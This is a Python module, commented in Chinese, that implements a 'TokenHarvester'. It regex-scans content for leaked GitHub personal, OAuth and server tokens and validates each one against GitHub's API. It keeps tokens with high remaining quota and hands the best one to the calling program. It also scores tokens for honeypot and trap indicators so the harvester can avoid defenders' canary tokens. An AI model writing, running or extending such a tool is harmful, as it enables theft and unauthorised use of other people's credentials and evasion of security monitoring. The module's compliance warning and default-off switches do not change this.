"""
Token收集器模块 - 自动发现和验证GitHub tokens
可通过环境变量配置是否启用
"""

import os
import re
import time
import asyncio
import hashlib
import logging
from typing import List, Dict, Any, Optional, Set
from datetime import datetime, timedelta
from dataclasses import dataclass, field
import requests
from enum import Enum

logger = logging.getLogger(__name__)


class TokenRiskLevel(Enum):
    """Token风险等级"""
    TRUSTED = 0      # 自己的tokens
    LOW = 1          # 低风险
    MEDIUM = 2       # 中等风险
    HIGH = 3         # 高风险
    CRITICAL = 4     # 极高风险
    BLACKLISTED = 5  # 黑名单


@dataclass
class DiscoveredToken:
    """发现的Token"""
    token: str
    source_url: str
    discovered_at: datetime
    risk_level: TokenRiskLevel = TokenRiskLevel.HIGH
    remaining_quota: int = 0
    is_valid: bool = False
    validation_attempts: int = 0
    last_validation: Optional[datetime] = None
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def masked_token(self) -> str:
        """返回掩码后的token"""
        if len(self.token) > 10:
            return f"{self.token[:7]}...{self.token[-4:]}"
        return "***"
    
    @property
    def token_hash(self) -> str:
        """返回token的哈希值（用于去重）"""
        return hashlib.sha256(self.token.encode()).hexdigest()[:16]


class TokenHarvester:
    """
    Token收集器 - 自动发现、验证和管理GitHub tokens
    通过环境变量控制功能开关
    """
    
    # GitHub token正则模式
    TOKEN_PATTERNS = [
        r'ghp_[a-zA-Z0-9]{36}',                          # Personal access token
        r'github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}',   # Fine-grained PAT
        r'gho_[a-zA-Z0-9]{36}',                          # OAuth token
        r'ghs_[a-zA-Z0-9]{36}',                          # Server token
    ]
    
    # 蜜罐检测模式
    HONEYPOT_INDICATORS = [
        'honeypot', 'honey_pot', 'trap', 'fake', 'test', 'demo',
        'example', 'sample', 'dummy', 'placeholder', 'xxx'
    ]
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        初始化Token收集器
        
        Args:
            config: 配置字典
        """
        self.config = config or self._load_config()
        
        # 功能开关（从环境变量读取）
        self.enabled = self._is_feature_enabled()
        
        # 安全配置
        self.risk_threshold = self.config.get('risk_threshold', TokenRiskLevel.MEDIUM.value)
        self.max_validation_attempts = self.config.get('max_validation_attempts', 3)
        self.validation_cooldown = self.config.get('validation_cooldown', 300)  # 5分钟
        
        # Token池
        self.discovered_tokens: Dict[str, DiscoveredToken] = {}  # hash -> token
        self.validated_tokens: List[DiscoveredToken] = []
        self.blacklisted_hashes: Set[str] = set()
        
        # 统计
        self.stats = {
            'total_discovered': 0,
            'total_validated': 0,
            'total_added': 0,
            'total_rejected': 0,
            'honeypots_detected': 0
        }
        
        if self.enabled:
            logger.info("🔍 TokenHarvester enabled - will auto-discover tokens")
            logger.warning("⚠️ WARNING: This feature should only be used in compliance with applicable laws and terms of service")
        else:
            logger.info("🔒 TokenHarvester disabled - using only configured tokens")
    
    def _load_config(self) -> Dict[str, Any]:
        """加载配置"""
        return {
            'enabled': os.getenv('CREDENTIAL_AUTO_HARVEST', 'false').lower() == 'true',
            'risk_threshold': int(os.getenv('CREDENTIAL_HARVEST_RISK_THRESHOLD', '2')),
            'validate_discovered': os.getenv('CREDENTIAL_VALIDATE_DISCOVERED', 'true').lower() == 'true',
            'max_discovered_tokens': int(os.getenv('CREDENTIAL_MAX_DISCOVERED', '10')),
            'sandbox_validation': os.getenv('CREDENTIAL_SANDBOX_VALIDATION', 'true').lower() == 'true',
            'honeypot_detection': os.getenv('CREDENTIAL_HONEYPOT_DETECTION', 'true').lower() == 'true',
        }
    
    def _is_feature_enabled(self) -> bool:
        """检查功能是否启用"""
        # 多重检查确保安全
        if not self.config.get('enabled', False):
            return False
        
        # 检查是否在生产环境（生产环境默认禁用）
        if os.getenv('ENVIRONMENT', 'development') == 'production':
            # 生产环境需要显式启用
            if os.getenv('CREDENTIAL_HARVEST_PRODUCTION', 'false').lower() != 'true':
                logger.warning("⚠️ Token harvesting disabled in production (set CREDENTIAL_HARVEST_PRODUCTION=true to override)")
                return False
        
        return True
    
    def extract_tokens_from_content(self, content: str, source_url: str = "") -> List[DiscoveredToken]:
        """
        从内容中提取GitHub tokens
        
        Args:
            content: 要扫描的内容
            source_url: 内容来源URL
            
        Returns:
            发现的tokens列表
        """
        if not self.enabled:
            return []
        
        discovered = []
        
        for pattern in self.TOKEN_PATTERNS:
            matches = re.findall(pattern, content)
            
            for token in matches:
                # 计算哈希用于去重
                token_hash = hashlib.sha256(token.encode()).hexdigest()[:16]
                
                # 跳过已知的token
                if token_hash in self.discovered_tokens or token_hash in self.blacklisted_hashes:
                    continue
                
                # 初步风险评估
                risk_level = self._assess_initial_risk(token, content, source_url)
                
                # 创建DiscoveredToken对象
                discovered_token = DiscoveredToken(
                    token=token,
                    source_url=source_url,
                    discovered_at=datetime.now(),
                    risk_level=risk_level,
                    metadata={
                        'pattern': pattern,
                        'context': self._extract_context(content, token)
                    }
                )
                
                # 检查是否为蜜罐
                if self.config.get('honeypot_detection') and self._is_honeypot(discovered_token):
                    logger.warning(f"🍯 Potential honeypot detected: {discovered_token.masked_token}")
                    self.stats['honeypots_detected'] += 1
                    self.blacklisted_hashes.add(token_hash)
                    continue
                
                discovered.append(discovered_token)
                self.discovered_tokens[token_hash] = discovered_token
                self.stats['total_discovered'] += 1
        
        if discovered:
            logger.info(f"🔍 Discovered {len(discovered)} potential tokens from {source_url}")
        
        return discovered
    
    def _assess_initial_risk(self, token: str, content: str, source_url: str) -> TokenRiskLevel:
        """初步风险评估"""
        risk_score = 0
        
        # 检查来源
        suspicious_domains = ['honeypot', 'trap', 'test', 'demo', 'example']
        for domain in suspicious_domains:
            if domain in source_url.lower():
                risk_score += 3
        
        # 检查上下文
        context = content[max(0, content.find(token) - 100):content.find(token) + 100]
        for indicator in self.HONEYPOT_INDICATORS:
            if indicator in context.lower():
                risk_score += 2
        
        # 检查token熵值
        entropy = self._calculate_entropy(token)
        if entropy < 3.0 or entropy > 5.5:
            risk_score += 1
        
        # 转换为风险等级
        if risk_score >= 7:
            return TokenRiskLevel.CRITICAL
        elif risk_score >= 5:
            return TokenRiskLevel.HIGH
        elif risk_score >= 3:
            return TokenRiskLevel.MEDIUM
        elif risk_score >= 1:
            return TokenRiskLevel.LOW
        else:
            return TokenRiskLevel.LOW
    
    def _calculate_entropy(self, token: str) -> float:
        """计算Shannon熵"""
        import math
        from collections import Counter
        
        if not token:
            return 0
        
        counter = Counter(token)
        length = len(token)
        entropy = 0
        
        for count in counter.values():
            probability = count / length
            if probability > 0:
                entropy -= probability * math.log2(probability)
        
        return entropy
    
    def _extract_context(self, content: str, token: str, context_size: int = 200) -> str:
        """提取token周围的上下文"""
        index = content.find(token)
        if index == -1:
            return ""
        
        start = max(0, index - context_size // 2)
        end = min(len(content), index + len(token) + context_size // 2)
        
        context = content[start:end]
        # 替换token为掩码
        context = context.replace(token, "[TOKEN]")
        
        return context
    
    def _is_honeypot(self, discovered_token: DiscoveredToken) -> bool:
        """检测是否为蜜罐token"""
        # 检查上下文中的蜜罐指示器
        context = discovered_token.metadata.get('context', '').lower()
        honeypot_score = 0
        
        for indicator in self.HONEYPOT_INDICATORS:
            if indicator in context:
                honeypot_score += 1
        
        # 检查token本身的特征
        token = discovered_token.token
        
        # 重复字符检测
        if any(char * 5 in token for char in '0123456789abcdef'):
            honeypot_score += 2
        
        # 熵值异常
        entropy = self._calculate_entropy(token)
        if entropy < 2.5:  # 熵值太低
            honeypot_score += 2
        
        return honeypot_score >= 3
    
    async def validate_token(self, discovered_token: DiscoveredToken) -> bool:
        """
        验证发现的token
        
        Args:
            discovered_token: 要验证的token
            
        Returns:
            是否有效
        """
        if not self.enabled or not self.config.get('validate_discovered', True):
            return False
        
        # 检查验证冷却时间
        if discovered_token.last_validation:
            cooldown_end = discovered_token.last_validation + timedelta(seconds=self.validation_cooldown)
            if datetime.now() < cooldown_end:
                logger.debug(f"Token {discovered_token.masked_token} in validation cooldown")
                return False
        
        # 检查验证次数
        if discovered_token.validation_attempts >= self.max_validation_attempts:
            logger.debug(f"Token {discovered_token.masked_token} exceeded max validation attempts")
            return False
        
        discovered_token.validation_attempts += 1
        discovered_token.last_validation = datetime.now()
        
        try:
            # 使用沙箱验证（如果启用）
            if self.config.get('sandbox_validation', True):
                return await self._sandbox_validate(discovered_token)
            else:
                return await self._direct_validate(discovered_token)
                
        except Exception as e:
            logger.error(f"Token validation error: {e}")
            return False
    
    async def _sandbox_validate(self, discovered_token: DiscoveredToken) -> bool:
        """沙箱环境验证（更安全）"""
        try:
            # 只使用只读API进行验证
            headers = {
                "Authorization": f"token {discovered_token.token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # 使用rate_limit端点（只读，安全）
            response = requests.get(
                "https://api.github.com/rate_limit",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                remaining = data.get('rate', {}).get('remaining', 0)
                
                discovered_token.remaining_quota = remaining
                discovered_token.is_valid = True
                
                # 只接受有足够配额的token
                if remaining > 1000:  # 至少1000次剩余
                    self.validated_tokens.append(discovered_token)
                    self.stats['total_validated'] += 1
                    logger.info(f"✅ Validated token with {remaining} remaining quota")
                    return True
                else:
                    logger.info(f"⚠️ Token valid but low quota: {remaining}")
                    
            elif response.status_code == 401:
                # 无效token
                discovered_token.is_valid = False
                self.blacklisted_hashes.add(discovered_token.token_hash)
                
        except Exception as e:
            logger.debug(f"Sandbox validation failed: {e}")
        
        return False
    
    async def _direct_validate(self, discovered_token: DiscoveredToken) -> bool:
        """直接验证（风险较高）"""
        # 不推荐使用，仅作为备选
        logger.warning("⚠️ Direct validation not recommended for discovered tokens")
        return False
    
    def get_best_discovered_token(self) -> Optional[DiscoveredToken]:
        """获取最佳的已发现token"""
        if not self.enabled or not self.validated_tokens:
            return None
        
        # 过滤风险等级
        acceptable_tokens = [
            t for t in self.validated_tokens
            if t.risk_level.value <= self.risk_threshold
            and t.remaining_quota > 100
        ]
        
        if not acceptable_tokens:
            return None
        
        # 按剩余配额排序
        acceptable_tokens.sort(key=lambda t: t.remaining_quota, reverse=True)
        
        return acceptable_tokens[0]
    
    def should_use_discovered_token(self) -> bool:
        """决定是否应该使用发现的token"""
        if not self.enabled:
            return False
        
        # 检查是否有可用的已验证token
        if not self.validated_tokens:
            return False
        
        # 检查是否达到最大使用数量
        max_discovered = self.config.get('max_discovered_tokens', 10)
        if len(self.validated_tokens) > max_discovered:
            return False
        
        return True
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取统计信息"""
        return {
            'enabled': self.enabled,
            'stats': self.stats.copy(),
            'discovered_count': len(self.discovered_tokens),
            'validated_count': len(self.validated_tokens),
            'blacklisted_count': len(self.blacklisted_hashes),
            'risk_threshold': self.risk_threshold
        }
    
    def cleanup_expired_tokens(self):
        """清理过期的发现tokens"""
        if not self.enabled:
            return
        
        # 移除验证失败次数过多的
        self.validated_tokens = [
            t for t in self.validated_tokens
            if t.validation_attempts < self.max_validation_attempts
        ]
        
        # 移除太旧的发现tokens（24小时）
        cutoff_time = datetime.now() - timedelta(hours=24)
        
        expired_hashes = []
        for token_hash, token in self.discovered_tokens.items():
            if token.discovered_at < cutoff_time:
                expired_hashes.append(token_hash)
        
        for token_hash in expired_hashes:
            del self.discovered_tokens[token_hash]
        
        if expired_hashes:
            logger.info(f"🧹 Cleaned up {len(expired_hashes)} expired discovered tokens")


# 全局实例
_harvester_instance: Optional[TokenHarvester] = None


def get_token_harvester(config: Optional[Dict[str, Any]] = None) -> TokenHarvester:
    """获取全局TokenHarvester实例"""
    global _harvester_instance
    if _harvester_instance is None:
        _harvester_instance = TokenHarvester(config)
    return _harvester_instance